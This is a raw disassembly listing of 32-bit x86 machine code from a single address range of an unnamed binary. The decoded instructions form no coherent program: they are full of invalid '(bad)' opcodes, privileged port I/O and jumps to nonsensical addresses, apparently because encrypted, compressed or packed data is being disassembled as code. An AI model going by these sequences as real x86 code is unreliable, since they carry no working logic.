  40d0f0:	93                   	xchg   %eax,%ebx
  40d0f1:	0f b5 a0 b3 d6 e3 8f 	lgs    -0x701c294d(%eax),%esp
  40d0f8:	6e                   	outsb  %ds:(%esi),(%dx)
  40d0f9:	3b d1                	cmp    %ecx,%edx
  40d0fb:	7b bb                	jnp    0x40d0b8
  40d0fd:	a9 7d 64 5f fa       	test   $0xfa5f647d,%eax
  40d102:	78 24                	js     0x40d128
  40d104:	c6                   	(bad)
  40d105:	aa                   	stos   %al,%es:(%edi)
  40d106:	7a c6                	jp     0x40d0ce
  40d108:	71 16                	jno    0x40d120
  40d10a:	c5 ab ed 0d bf 77    	lds    0x77bf0ded(%ebx),%ebp
  40d110:	dd 27                	frstor (%edi)
  40d112:	4d                   	dec    %ebp
  40d113:	57                   	push   %edi
  40d114:	3c 11                	cmp    $0x11,%al
  40d116:	d1 4d 06             	rorl   $1,0x6(%ebp)
  40d119:	2a df                	sub    %bh,%bl
  40d11b:	3b 66 fa             	cmp    -0x6(%esi),%esp
  40d11e:	84 6b de             	test   %ch,-0x22(%ebx)
  40d121:	d3 05 6d bd 81 e9    	roll   %cl,0xe981bd6d
  40d127:	1b 62 2b             	sbb    0x2b(%edx),%esp
  40d12a:	79 99                	jns    0x40d0c5
  40d12c:	41                   	inc    %ecx
  40d12d:	9d                   	popf
  40d12e:	60                   	pusha
  40d12f:	d5 1f                	aad    $0x1f
  40d131:	55                   	push   %ebp
  40d132:	d3 da                	rcr    %cl,%edx
  40d134:	45                   	inc    %ebp
  40d135:	67 63 93 36 a3       	arpl   %edx,-0x5cca(%bp,%di)
  40d13a:	54                   	push   %esp
  40d13b:	96                   	xchg   %eax,%esi
  40d13c:	f7 7e d2             	idivl  -0x2e(%esi)
  40d13f:	ff                   	(bad)
  40d140:	38 65 95             	cmp    %ah,-0x6b(%ebp)
  40d143:	9c                   	pushf
  40d144:	3c de                	cmp    $0xde,%al
  40d146:	c6                   	(bad)
  40d147:	7e 93                	jle    0x40d0dc
  40d149:	d7                   	xlat   %ds:(%ebx)
  40d14a:	ca 33 53             	lret   $0x5333
  40d14d:	40                   	inc    %eax
  40d14e:	b8 b3 a6 8e de       	mov    $0xde8ea6b3,%eax
  40d153:	2a f4                	sub    %ah,%dh
  40d155:	dd b5 d6 0f 6a 4d    	fnsave 0x4d6a0fd6(%ebp)
  40d15b:	ba aa 4d 4d 72       	mov    $0x724d4daa,%edx
  40d160:	83 c8 3d             	or     $0x3d,%eax
  40d163:	48                   	dec    %eax
  40d164:	20 f3                	and    %dh,%bl
  40d166:	4d                   	dec    %ebp
  40d167:	6b 3e ae             	imul   $0xffffffae,(%esi),%edi
  40d16a:	77 01                	ja     0x40d16d
  40d16c:	b2 38                	mov    $0x38,%dl
  40d16e:	08 b8 90 55 31 06    	or     %bh,0x6315590(%eax)
  40d174:	ce                   	into
  40d175:	74 ba                	je     0x40d131
  40d177:	70 61                	jo     0x40d1da
  40d179:	2a 01                	sub    (%ecx),%al
  40d17b:	2e 82 1c b3 0d       	sbbb   $0xd,%cs:(%ebx,%esi,4)
  40d180:	11 2f                	adc    %ebp,(%edi)
  40d182:	da c0                	fcmovb %st(0),%st
  40d184:	72 f8                	jb     0x40d17e
  40d186:	10 44 3c b0          	adc    %al,-0x50(%esp,%edi,1)
  40d18a:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40d18b:	fe 40 2f             	incb   0x2f(%eax)
  40d18e:	b6 87                	mov    $0x87,%dh
  40d190:	c5 63 9a             	lds    -0x66(%ebx),%esp
  40d193:	d5 39                	aad    $0x39
  40d195:	b1 81                	mov    $0x81,%cl
  40d197:	32 f7                	xor    %bh,%dh
  40d199:	fd                   	std
  40d19a:	53                   	push   %ebx
  40d19b:	ae                   	scas   %es:(%edi),%al
  40d19c:	32 a6 0c 70 3d 6f    	xor    0x6f3d700c(%esi),%ah
  40d1a2:	a3 3e 93 e6 48       	mov    %eax,0x48e6933e
  40d1a7:	e1 38                	loope  0x40d1e1
  40d1a9:	e1 9c                	loope  0x40d147
  40d1ab:	b8 f2 30 10 35       	mov    $0x351030f2,%eax
  40d1b0:	a0 c2 e4 18 58       	mov    0x5818e4c2,%al
  40d1b5:	5a                   	pop    %edx
  40d1b6:	84 68 dd             	test   %ch,-0x23(%eax)
  40d1b9:	73 48                	jae    0x40d203
  40d1bb:	1f                   	pop    %ds
  40d1bc:	67 6f                	outsl  %ds:(%si),(%dx)
  40d1be:	72 20                	jb     0x40d1e0
  40d1c0:	93                   	xchg   %eax,%ebx
  40d1c1:	4b                   	dec    %ebx
  40d1c2:	c3                   	ret
  40d1c3:	b9 08 11 0f ef       	mov    $0xef0f1108,%ecx
  40d1c8:	64 af                	fs scas %es:(%edi),%eax
  40d1ca:	71 dc                	jno    0x40d1a8
  40d1cc:	04 9d                	add    $0x9d,%al
  40d1ce:	58                   	pop    %eax
  40d1cf:	14 13                	adc    $0x13,%al
  40d1d1:	e8 08 45 99 d2       	call   0xd2da16de
  40d1d6:	89 cb                	mov    %ecx,%ebx
  40d1d8:	11 45 e4             	adc    %eax,-0x1c(%ebp)
  40d1db:	f0 05 6b ab 90 f4    	lock add $0xf490ab6b,%eax
  40d1e1:	65 30 b9 92 64 c6 30 	xor    %bh,%gs:0x30c66492(%ecx)
  40d1e8:	97                   	xchg   %eax,%edi
  40d1e9:	39 60 2d             	cmp    %esp,0x2d(%eax)
  40d1ec:	97                   	xchg   %eax,%edi
  40d1ed:	9b                   	fwait
  40d1ee:	3a 4e 0e             	cmp    0xe(%esi),%cl
  40d1f1:	37                   	aaa
  40d1f2:	49                   	dec    %ecx
  40d1f3:	3f                   	aas
  40d1f4:	65 78 5f             	gs js  0x40d256
  40d1f7:	09 33                	or     %esi,(%ebx)
  40d1f9:	f8                   	clc
  40d1fa:	e0 05                	loopne 0x40d201
  40d1fc:	53                   	push   %ebx
  40d1fd:	d2 e5                	shl    %cl,%ch
  40d1ff:	df b7 ac 43 4d 77    	fbstp  0x774d43ac(%edi)
  40d205:	b8 0c c6 28 c1       	mov    $0xc128c60c,%eax
  40d20a:	28 3c d9             	sub    %bh,(%ecx,%ebx,8)
  40d20d:	e0 c3                	loopne 0x40d1d2
  40d20f:	67 fb                	addr16 sti
  40d211:	54                   	push   %esp
  40d212:	31 23                	xor    %esp,(%ebx)
  40d214:	0a 51 66             	or     0x66(%ecx),%dl
  40d217:	f9                   	stc
  40d218:	8b b0 10 de 9f da    	mov    -0x256021f0(%eax),%esi
  40d21e:	78 74                	js     0x40d294
  40d220:	ee                   	out    %al,(%dx)
  40d221:	e8 c7 bc 73 d3       	call   0xd3b48eed
  40d226:	86 47 b9             	xchg   %al,-0x47(%edi)
  40d229:	d2 d1                	rcl    %cl,%cl
  40d22b:	de 4d 02             	fimuls 0x2(%ebp)
  40d22e:	cb                   	lret
  40d22f:	64 9b                	fs fwait
  40d231:	6b 3c d0 1b          	imul   $0x1b,(%eax,%edx,8),%edi
  40d235:	69 53 d5 46 8c b3 c9 	imul   $0xc9b38c46,-0x2b(%ebx),%edx
  40d23c:	6d                   	insl   (%dx),%es:(%edi)
  40d23d:	20 f5                	and    %dh,%ch
  40d23f:	66 73 6a             	data16 jae 0x40d2ac
  40d242:	cb                   	lret
  40d243:	79 c0                	jns    0x40d205
  40d245:	3e dc a9 bd 46 d1 a0 	fsubrl %ds:-0x5f2eb943(%ecx)
  40d24c:	c9                   	leave
  40d24d:	a1 24 7e 31 95       	mov    0x95317e24,%eax
  40d252:	ea d5 2f 29 7c 8f 80 	ljmp   $0x808f,$0x7c292fd5
  40d259:	28 e1                	sub    %ah,%cl
  40d25b:	c9                   	leave
  40d25c:	16                   	push   %ss
  40d25d:	f5                   	cmc
  40d25e:	51                   	push   %ecx
  40d25f:	8f                   	(bad)
  40d260:	3a e2                	cmp    %dl,%ah
  40d262:	c7                   	(bad)
  40d263:	da 18                	ficompl (%eax)
  40d265:	3b fa                	cmp    %edx,%edi
  40d267:	84 5e 3f             	test   %bl,0x3f(%esi)
  40d26a:	71 49                	jno    0x40d2b5
  40d26c:	5d                   	pop    %ebp
  40d26d:	7d 06                	jge    0x40d275
  40d26f:	25 49 db f0 ce       	and    $0xcef0db49,%eax
  40d274:	bd 59 9f 98 6a       	mov    $0x6a989f59,%ebp
  40d279:	83 02 76             	addl   $0x76,(%edx)
  40d27c:	45                   	inc    %ebp
  40d27d:	93                   	xchg   %eax,%ebx
  40d27e:	bf 61 aa ab 18       	mov    $0x18abaa61,%edi
  40d283:	b3 20                	mov    $0x20,%bl
  40d285:	23 cc                	and    %esp,%ecx
  40d287:	a2 37 56 37 ad       	mov    %al,0xad375637
  40d28c:	f1                   	int1
  40d28d:	32 07                	xor    (%edi),%al
  40d28f:	11 37                	adc    %esi,(%edi)
  40d291:	98                   	cwtl
  40d292:	9c                   	pushf
  40d293:	ba 39 7e 76 62       	mov    $0x62767e39,%edx
  40d298:	da b0 21 71 3d 4d    	fidivl 0x4d3d7121(%eax)
  40d29e:	5f                   	pop    %edi
  40d29f:	95                   	xchg   %eax,%ebp
  40d2a0:	ab                   	stos   %eax,%es:(%edi)
  40d2a1:	09 90 83 cd 58 4a    	or     %edx,0x4a58cd83(%eax)
  40d2a7:	03 6a 11             	add    0x11(%edx),%ebp
  40d2aa:	ab                   	stos   %eax,%es:(%edi)
  40d2ab:	24 a6                	and    $0xa6,%al
  40d2ad:	dc d8                	(bad)
  40d2af:	29 15 e9 67 c8 36    	sub    %edx,0x36c867e9
  40d2b5:	9c                   	pushf
  40d2b6:	b9 21 f8 bd 94       	mov    $0x94bdf821,%ecx
  40d2bb:	c6                   	(bad)
  40d2bc:	89 44 d5 ed          	mov    %eax,-0x13(%ebp,%edx,8)
  40d2c0:	1c 5d                	sbb    $0x5d,%al
  40d2c2:	9a 11 64 53 19 47 79 	lcall  $0x7947,$0x19536411
  40d2c9:	69 0d cd 5c 42 3a 47 	imul   $0x9adc7747,0x3a425ccd,%ecx
  40d2d0:	77 dc 9a 
  40d2d3:	1e                   	push   %ds
  40d2d4:	1a b6 2d a4 a5 e7    	sbb    -0x185a5bd3(%esi),%dh
  40d2da:	f2 77 d3             	bnd ja 0x40d2b0
  40d2dd:	98                   	cwtl
  40d2de:	32 13                	xor    (%ebx),%dl
  40d2e0:	44                   	inc    %esp
  40d2e1:	3b 4b d0             	cmp    -0x30(%ebx),%ecx
  40d2e4:	41                   	inc    %ecx
  40d2e5:	1e                   	push   %ds
  40d2e6:	30 bd 57 df 92 8f    	xor    %bh,-0x706d20a9(%ebp)
  40d2ec:	9f                   	lahf
  40d2ed:	42                   	inc    %edx
  40d2ee:	fd                   	std
  40d2ef:	e4 9c                	in     $0x9c,%al
  40d2f1:	b8 40 1d c2 35       	mov    $0x35c21d40,%eax
  40d2f6:	bb d8 03 dc 2d       	mov    $0x2ddc03d8,%ebx
  40d2fb:	27                   	daa
  40d2fc:	5f                   	pop    %edi
  40d2fd:	2b d7                	sub    %edi,%edx
  40d2ff:	b3 2f                	mov    $0x2f,%bl
  40d301:	6e                   	outsb  %ds:(%esi),(%dx)
  40d302:	97                   	xchg   %eax,%edi
  40d303:	8d 6b 0a             	lea    0xa(%ebx),%ebp
  40d306:	e7 b4                	out    %eax,$0xb4
  40d308:	86 95 b1 34 10 55    	xchg   %dl,0x551034b1(%ebp)
  40d30e:	d1 18                	rcrl   $1,(%eax)
  40d310:	8e c1                	mov    %ecx,%es
  40d312:	0e                   	push   %cs
  40d313:	2b 5b 55             	sub    0x55(%ebx),%ebx
  40d316:	27                   	daa
  40d317:	92                   	xchg   %eax,%edx
  40d318:	60                   	pusha
  40d319:	02 76 02             	add    0x2(%esi),%dh
  40d31c:	02 54 24 e4          	add    -0x1c(%esp),%dl
  40d320:	f4                   	hlt
  40d321:	74 d6                	je     0x40d2f9
  40d323:	8c 01                	mov    %es,(%ecx)
  40d325:	9b                   	fwait
  40d326:	2d fe 61 21 f7       	sub    $0xf72161fe,%eax
  40d32b:	5d                   	pop    %ebp
  40d32c:	5f                   	pop    %edi
  40d32d:	37                   	aaa
  40d32e:	4b                   	dec    %ebx
  40d32f:	3a 11                	cmp    (%ecx),%dl
  40d331:	4c                   	dec    %esp
  40d332:	eb 90                	jmp    0x40d2c4
  40d334:	d9 08                	(bad) (%eax)
  40d336:	1b 6e e3             	sbb    -0x1d(%esi),%ebp
  40d339:	49                   	dec    %ecx
  40d33a:	20 c0                	and    %al,%al
  40d33c:	1f                   	pop    %ds
  40d33d:	f5                   	cmc
  40d33e:	32 55 07             	xor    0x7(%ebp),%dl
  40d341:	87 45 5b             	xchg   %eax,0x5b(%ebp)
  40d344:	0d 28 cf c8 b6       	or     $0xb6c8cf28,%eax
  40d349:	1b b4 f7 3d b7 80 d8 	sbb    -0x277f48c3(%edi,%esi,8),%esi
  40d350:	32 fb                	xor    %bl,%bh
  40d352:	78 76                	js     0x40d3ca
  40d354:	0c ba                	or     $0xba,%al
  40d356:	14 03                	adc    $0x3,%al
  40d358:	29 77 91             	sub    %esi,-0x6f(%edi)
  40d35b:	f2 6c                	repnz insb (%dx),%es:(%edi)
  40d35d:	8c e8                	mov    %gs,%eax
  40d35f:	48                   	dec    %eax
  40d360:	d9 db                	(bad)
  40d362:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40d363:	d9 0b                	(bad) (%ebx)
  40d365:	d0 2a                	shrb   $1,(%edx)
  40d367:	2a 61 b1             	sub    -0x4f(%ecx),%ah
  40d36a:	f3 6f                	rep outsl %ds:(%esi),(%dx)
  40d36c:	91                   	xchg   %eax,%ecx
  40d36d:	19 15 18 dd 0b 35    	sbb    %edx,0x350bdd18
  40d373:	e3 19                	jecxz  0x40d38e
  40d375:	4c                   	dec    %esp
  40d376:	f6 d3                	not    %bl
  40d378:	b7 e0                	mov    $0xe0,%bh
  40d37a:	c3                   	ret
  40d37b:	d7                   	xlat   %ds:(%ebx)
  40d37c:	1a 62 eb             	sbb    -0x15(%edx),%ah
  40d37f:	9e                   	sahf
  40d380:	9a 0f 38 85 a4 d4 16 	lcall  $0x16d4,$0xa485380f
  40d387:	23 22                	and    (%edx),%esp
  40d389:	c4 4f 49             	les    0x49(%edi),%ecx
  40d38c:	63 a5 d1 98 fa 9f    	arpl   %esp,-0x6005672f(%ebp)
  40d392:	d0 08                	rorb   $1,(%eax)
  40d394:	78 43                	js     0x40d3d9
  40d396:	7f 7d                	jg     0x40d415
  40d398:	5d                   	pop    %ebp
  40d399:	4f                   	dec    %edi
  40d39a:	e9 86 ea 73 8e       	jmp    0x8eb4be25
  40d39f:	7d 97                	jge    0x40d338
  40d3a1:	3c 88                	cmp    $0x88,%al
  40d3a3:	ad                   	lods   %ds:(%esi),%eax
  40d3a4:	c8 5a 3b fb          	enter  $0x3b5a,$0xfb
  40d3a8:	bc 98 fa ca 95       	mov    $0x95cafa98,%esp
  40d3ad:	71 d8                	jno    0x40d387
  40d3af:	35 a6 ac f7 ec       	xor    $0xecf7aca6,%eax
  40d3b4:	57                   	push   %edi
  40d3b5:	f7 f2                	div    %edx
  40d3b7:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40d3b8:	94                   	xchg   %eax,%esp
  40d3b9:	cc                   	int3
  40d3ba:	9c                   	pushf
  40d3bb:	93                   	xchg   %eax,%ebx
  40d3bc:	c0 be 94 86 32 eb 03 	sarb   $0x3,-0x14cd796c(%esi)
  40d3c3:	bb db 40 ff 8a       	mov    $0x8aff40db,%ebx
  40d3c8:	77 0d                	ja     0x40d3d7
  40d3ca:	1f                   	pop    %ds
  40d3cb:	96                   	xchg   %eax,%esi
  40d3cc:	32 5b 43             	xor    0x43(%ebx),%bl
  40d3cf:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40d3d0:	d9 83 d6 7a ae a3    	flds   -0x5c51852a(%ebx)
  40d3d6:	a9 e9 af c2 91       	test   $0x91c2afe9,%eax
  40d3db:	71 18                	jno    0x40d3f5
  40d3dd:	3b 06                	cmp    (%esi),%eax
  40d3df:	1d c8 9f f4 fb       	sbb    $0xfbf49fc8,%eax
  40d3e4:	26 af                	es scas %es:(%edi),%eax
  40d3e6:	ea 3f 0b 03 04 9e 1e 	ljmp   $0x1e9e,$0x4030b3f
  40d3ed:	24 4e                	and    $0x4e,%al
  40d3ef:	c0 af a8 2e 9d 4e 9b 	shrb   $0x9b,0x4e9d2ea8(%edi)
  40d3f6:	6a 2d                	push   $0x2d
  40d3f8:	4d                   	dec    %ebp
  40d3f9:	4d                   	dec    %ebp
  40d3fa:	c8 8d 49 36          	enter  $0x498d,$0x36
  40d3fe:	2e ad                	lods   %cs:(%esi),%eax
  40d400:	c0 7a 77 cb          	sarb   $0xcb,0x77(%edx)
  40d404:	5d                   	pop    %ebp
  40d405:	5e                   	pop    %esi
  40d406:	04 7f                	add    $0x7f,%al
  40d408:	61                   	popa
  40d409:	54                   	push   %esp
  40d40a:	ce                   	into
  40d40b:	9b                   	fwait
  40d40c:	e5 c3                	in     $0xc3,%eax
  40d40e:	e4 4b                	in     $0x4b,%al
  40d410:	fd                   	std
  40d411:	b8 b9 c3 75 7e       	mov    $0x7e75c3b9,%eax
  40d416:	c3                   	ret
  40d417:	d8 32                	fdivs  (%edx)
  40d419:	c1 af ef 23 e7 ae 34 	shrl   $0x34,-0x5118dc11(%edi)
  40d420:	49                   	dec    %ecx
  40d421:	32 c8                	xor    %al,%cl
  40d423:	8e b7 4d d5 b9 aa    	mov    -0x55462ab3(%edi),%?
  40d429:	e6 03                	out    %al,$0x3
  40d42b:	22 bb 0f 16 07 dd    	and    -0x22f8e9f1(%ebx),%bh
  40d431:	f4                   	hlt
  40d432:	9b                   	fwait
  40d433:	5b                   	pop    %ebx
  40d434:	31 f0                	xor    %esi,%eax
  40d436:	a2 a5 71 82 c1       	mov    %al,0xc18271a5
  40d43b:	4d                   	dec    %ebp
  40d43c:	9c                   	pushf
  40d43d:	ab                   	stos   %eax,%es:(%edi)
  40d43e:	c7                   	(bad)
  40d43f:	f4                   	hlt
  40d440:	41                   	inc    %ecx
  40d441:	ac                   	lods   %ds:(%esi),%al
  40d442:	b8 58 da 3b 2e       	mov    $0x2e3bda58,%eax
  40d447:	e4 f9                	in     $0xf9,%al
  40d449:	02 ea                	add    %dl,%ch
  40d44b:	51                   	push   %ecx
  40d44c:	c3                   	ret
  40d44d:	66 71 9f             	data16 jno 0x40d3ef
  40d450:	83 b8 40 54 69 2b a7 	cmpl   $0xffffffa7,0x2b695440(%eax)
  40d457:	bd c2 5e 90 53       	mov    $0x53905ec2,%ebp
  40d45c:	94                   	xchg   %eax,%esp
  40d45d:	6d                   	insl   (%dx),%es:(%edi)
  40d45e:	8e 3b                	mov    (%ebx),%?
  40d460:	2b f7                	sub    %edi,%esi
  40d462:	da ad 4e 9f 70 df    	fisubrl -0x208f60b2(%ebp)
  40d468:	3e 7f e4             	jg,pt  0x40d44f
  40d46b:	82 d3 3e             	adc    $0x3e,%bl
  40d46e:	69 46 03 e6 76 c8 a9 	imul   $0xa9c876e6,0x3(%esi),%eax
  40d475:	5a                   	pop    %edx
  40d476:	e7 06                	out    %eax,$0x6
  40d478:	76 cf                	jbe    0x40d449
  40d47a:	88 20                	mov    %ah,(%eax)
  40d47c:	52                   	push   %edx
  40d47d:	eb 12                	jmp    0x40d491
  40d47f:	01 e8                	add    %ebp,%eax
  40d481:	92                   	xchg   %eax,%edx
  40d482:	d5 e7                	aad    $0xe7
  40d484:	10 7b b8             	adc    %bh,-0x48(%ebx)
  40d487:	11 d9                	adc    %ebx,%ecx
  40d489:	69 0d 61 a4 6b c6 ed 	imul   $0x27aeb3ed,0xc66ba461,%ecx
  40d490:	b3 ae 27 
  40d493:	44                   	inc    %esp
  40d494:	40                   	inc    %eax
  40d495:	f9                   	stc
  40d496:	fc                   	cld
  40d497:	72 c8                	jb     0x40d461
  40d499:	cb                   	lret
  40d49a:	b1 a6                	mov    $0xa6,%cl
  40d49c:	21 21                	and    %esp,(%ecx)
  40d49e:	99                   	cltd
  40d49f:	50                   	push   %eax
  40d4a0:	db 8a a7 97 84 16    	fisttpl 0x168497a7(%edx)
  40d4a6:	bf 02 da c6 8b       	mov    $0x8bc6da02,%edi
  40d4ab:	d7                   	xlat   %ds:(%ebx)
  40d4ac:	e6 cc                	out    %al,$0xcc
  40d4ae:	fe                   	(bad)
  40d4af:	5a                   	pop    %edx
  40d4b0:	15 fd 84 76 ef       	adc    $0xef7684fd,%eax
  40d4b5:	19 cd                	sbb    %ecx,%ebp
  40d4b7:	06                   	push   %es
  40d4b8:	1d ae d5 19 d3       	sbb    $0xd319d5ae,%eax
  40d4bd:	09 c4                	or     %eax,%esp
  40d4bf:	ba 98 81 6f dd       	mov    $0xdd6f8198,%edx
  40d4c4:	be 69 d2 ab 5d       	mov    $0x5dabd269,%esi
  40d4c9:	27                   	daa
  40d4ca:	83 03 ef             	addl   $0xffffffef,(%ebx)
  40d4cd:	09 bf eb b6 59 ca    	or     %edi,-0x35a64915(%edi)
  40d4d3:	41                   	inc    %ecx
  40d4d4:	23 c2                	and    %edx,%eax
  40d4d6:	56                   	push   %esi
  40d4d7:	d7                   	xlat   %ds:(%ebx)
  40d4d8:	ac                   	lods   %ds:(%esi),%al
  40d4d9:	ec                   	in     (%dx),%al
  40d4da:	8b ae cd 95 b3 14    	mov    0x14b395cd(%esi),%ebp
  40d4e0:	74 d4                	je     0x40d4b6
  40d4e2:	09 81 2f 15 0e 30    	or     %eax,0x300e152f(%ecx)
  40d4e8:	71 a2                	jno    0x40d48c
  40d4ea:	f0 f9                	lock stc
  40d4ec:	79 16                	jns    0x40d504
  40d4ee:	f1                   	int1
  40d4ef:	10 2c f7             	adc    %ch,(%edi,%esi,8)
  40d4f2:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40d4f3:	e3 3b                	jecxz  0x40d530
  40d4f5:	98                   	cwtl
  40d4f6:	f0 59                	lock pop %ecx
  40d4f8:	6d                   	insl   (%dx),%es:(%edi)
  40d4f9:	04 07                	add    $0x7,%al
  40d4fb:	32 e6                	xor    %dh,%ah
  40d4fd:	66 2b 5f 2f          	sub    0x2f(%edi),%bx
  40d501:	37                   	aaa
  40d502:	49                   	dec    %ecx
  40d503:	c4 11                	les    (%ecx),%edx
  40d505:	47                   	inc    %edi
  40d506:	c4 1c c8             	les    (%eax,%ecx,8),%ebx
  40d509:	f7 e1                	mul    %ecx
  40d50b:	32 0e                	xor    (%esi),%cl
  40d50d:	9d                   	popf
  40d50e:	7e 38                	jle    0x40d548
  40d510:	b4 6c                	mov    $0x6c,%ah
  40d512:	bc 8b 8b 57 fc       	mov    $0xfc578b8b,%esp
  40d517:	18 40 26             	sbb    %al,0x26(%eax)
  40d51a:	c7                   	(bad)
  40d51b:	35 10 b7 8b f6       	xor    $0xf68bb710,%eax
  40d520:	1a 37                	sbb    (%edi),%dh
  40d522:	fd                   	std
  40d523:	3d 1d 81 4b f2       	cmp    $0xf24b811d,%eax
  40d528:	49                   	dec    %ecx
  40d529:	d2 f9                	sar    %cl,%cl
  40d52b:	93                   	xchg   %eax,%ebx
  40d52c:	c3                   	ret
  40d52d:	59                   	pop    %ecx
  40d52e:	89 bb 0e b7 b7 bb    	mov    %edi,-0x444848f2(%ebx)
  40d534:	fe c6                	inc    %dh
  40d536:	d4 16                	aam    $0x16
  40d538:	ad                   	lods   %ds:(%esi),%eax
  40d539:	0e                   	push   %cs
  40d53a:	f1                   	int1
  40d53b:	a3 b1 f5 57 ad       	mov    %eax,0xad57f5b1
  40d540:	e5 53                	in     $0x53,%eax
  40d542:	d6                   	salc
  40d543:	3c 3e                	cmp    $0x3e,%al
  40d545:	f4                   	hlt
  40d546:	45                   	inc    %ebp
  40d547:	37                   	aaa
  40d548:	49                   	dec    %ecx
  40d549:	6f                   	outsl  %ds:(%esi),(%dx)
  40d54a:	05 94 04 34 37       	add    $0x37340494,%eax
  40d54f:	c1 57 75 dc          	rcll   $0xdc,0x75(%edi)
  40d553:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40d554:	56                   	push   %esi
  40d555:	f0 b8 bb fc 6c 26    	lock mov $0x266cfcbb,%eax
  40d55b:	2f                   	das
  40d55c:	90                   	nop
  40d55d:	ca 9e 76             	lret   $0x769e
  40d560:	db 25 d1 04 7a bf    	(bad) 0xbf7a04d1
  40d566:	f7 52 01             	notl   0x1(%edx)
  40d569:	67 d9 62 7d          	fldenv 0x7d(%bp,%si)
  40d56d:	09 65 38             	or     %esp,0x38(%ebp)
  40d570:	36 2d 05 da 29 b2    	ss sub $0xb229da05,%eax
  40d576:	c9                   	leave
  40d577:	be b1 f5 20 cf       	mov    $0xcf20f5b1,%esi
  40d57c:	e5 ce                	in     $0xce,%eax
  40d57e:	73 c2                	jae    0x40d542
  40d580:	29 81 62 73 e0 8e    	sub    %eax,-0x711f8c9e(%ecx)
  40d586:	1a 89 79 75 22 a7    	sbb    -0x58dd8a87(%ecx),%cl
  40d58c:	f6 c6 20             	test   $0x20,%dh
  40d58f:	0b 40 9e             	or     -0x62(%eax),%eax
  40d592:	91                   	xchg   %eax,%ecx
  40d593:	36 38 62 a6          	cmp    %ah,%ss:-0x5a(%edx)
  40d597:	6d                   	insl   (%dx),%es:(%edi)
  40d598:	c9                   	leave
  40d599:	ab                   	stos   %eax,%es:(%edi)
  40d59a:	70 28                	jo     0x40d5c4
  40d59c:	af                   	scas   %es:(%edi),%eax
  40d59d:	23 33                	and    (%ebx),%esi
  40d59f:	5b                   	pop    %ebx
  40d5a0:	84 6b dc             	test   %ch,-0x24(%ebx)
  40d5a3:	1c c1                	sbb    $0xc1,%al
  40d5a5:	0b c3                	or     %ebx,%eax
  40d5a7:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40d5a8:	14 32                	adc    $0x32,%al
  40d5aa:	1f                   	pop    %ds
  40d5ab:	bd 18 6d 85 f6       	mov    $0xf6856d18,%ebp
  40d5b0:	9e                   	sahf
  40d5b1:	3e cb                	ds lret
  40d5b3:	d8 58 d1             	fcomps -0x2f(%eax)
  40d5b6:	c5 e2 ad             	(bad)
  40d5b9:	ca 68 48             	lret   $0x4868
  40d5bc:	92                   	xchg   %eax,%edx
  40d5bd:	d2 01                	rolb   %cl,(%ecx)
  40d5bf:	14 df                	adc    $0xdf,%al
  40d5c1:	1e                   	push   %ds
  40d5c2:	bb 8e 86 7e f8       	mov    $0xf87e868e,%ebx
  40d5c7:	02 a0 d9 36 0d 3b    	add    0x3b0d36d9(%eax),%ah
  40d5cd:	39 d3                	cmp    %edx,%ebx
  40d5cf:	0c 00                	or     $0x0,%al
  40d5d1:	e2 42                	loop   0x40d615
  40d5d3:	25 1a 6e 17 69       	and    $0x69176e1a,%eax
  40d5d8:	e1 23                	loope  0x40d5fd
  40d5da:	3a 3f                	cmp    (%edi),%bh
  40d5dc:	31 1d 6c 57 44 43    	xor    %ebx,0x4344576c
  40d5e2:	43                   	inc    %ebx
  40d5e3:	52                   	push   %edx
  40d5e4:	86 17                	xchg   %dl,(%edi)
  40d5e6:	63 6a 4b             	arpl   %ebp,0x4b(%edx)
  40d5e9:	6b 0b 24             	imul   $0x24,(%ebx),%ecx
  40d5ec:	38 a7 15 97 56 56    	cmp    %ah,0x56569715(%edi)
  40d5f2:	63 9b 5f 11 2d a1    	arpl   %ebx,-0x5ed2eea1(%ebx)
  40d5f8:	b1 0f                	mov    $0xf,%cl
  40d5fa:	f3 a8 e4             	repz test $0xe4,%al
  40d5fd:	7c 87                	jl     0x40d586
  40d5ff:	55                   	push   %ebp
  40d600:	f7 13                	notl   (%ebx)
  40d602:	f4                   	hlt
  40d603:	f0 ed                	lock in (%dx),%eax
  40d605:	48                   	dec    %eax
  40d606:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40d607:	ea 86 df da 74 57 f5 	ljmp   $0xf557,$0x74dadf86
  40d60e:	2c e2                	sub    $0xe2,%al
  40d610:	63 fa                	arpl   %edi,%edx
  40d612:	c9                   	leave
  40d613:	40                   	inc    %eax
  40d614:	67 59                	addr16 pop %ecx
  40d616:	de 5f 60             	ficomps 0x60(%edi)
  40d619:	65 56                	gs push %esi
  40d61b:	d8 03                	fadds  (%ebx)
  40d61d:	73 b7                	jae    0x40d5d6
  40d61f:	02 ea                	add    %dl,%ch
  40d621:	52                   	push   %edx
  40d622:	a8 78                	test   $0x78,%al
  40d624:	8f                   	(bad)
  40d625:	f2 69 7a 0c ad 5f ed 	repnz imul $0x6eed5fad,0xc(%edx),%edi
  40d62c:	6e 
  40d62d:	0c 20                	or     $0x20,%al
  40d62f:	09 09                	or     %ecx,(%ecx)
  40d631:	5e                   	pop    %esi
  40d632:	10 13                	adc    %dl,(%ebx)
  40d634:	0a 0b                	or     (%ebx),%cl
  40d636:	3f                   	aas
  40d637:	32 6d 70             	xor    0x70(%ebp),%ch
  40d63a:	92                   	xchg   %eax,%edx
  40d63b:	85 86 0c 31 a9 60    	test   %eax,0x60a9310c(%esi)
  40d641:	a3 53 21 7d 48       	mov    %eax,0x487d2153
  40d646:	00 54 63 28          	add    %dl,0x28(%ebx,%eiz,2)
  40d64a:	09 f4                	or     %esi,%esp
  40d64c:	ee                   	out    %al,(%dx)
  40d64d:	2b bb 57 ea ba 8e    	sub    -0x714515a9(%ebx),%edi
  40d653:	d9 67 6b             	fldenv 0x6b(%edi)
  40d656:	03 a4 6d 02 06 c3 65 	add    0x65c30602(%ebp,%ebp,2),%esp
  40d65d:	7d c9                	jge    0x40d628
  40d65f:	f2 ba a6 4e b5 ca    	repnz mov $0xcab54ea6,%edx
  40d665:	2c 7b                	sub    $0x7b,%al
  40d667:	e8 72 c0 d5 2d       	call   0x2e1696de
  40d66c:	0d bf 78 01 e0       	or     $0xe00178bf,%eax
